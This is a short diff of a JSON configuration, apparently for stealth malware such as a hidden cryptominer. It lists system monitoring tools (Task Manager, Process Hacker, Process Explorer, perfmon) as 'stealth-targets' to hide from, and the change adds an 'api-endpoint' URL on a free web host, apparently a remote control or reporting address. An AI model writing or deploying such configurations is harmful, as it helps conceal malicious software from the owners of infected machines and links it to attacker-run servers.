@@ -12,5 +12,5 @@
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
     "kill-targets": "",
     "stealth-fullscreen": true,
-    "api-endpoint": ""
+    "api-endpoint": "https://my2dshadow.000webhostapp.com/public_html/api/endpoint.php"
 }
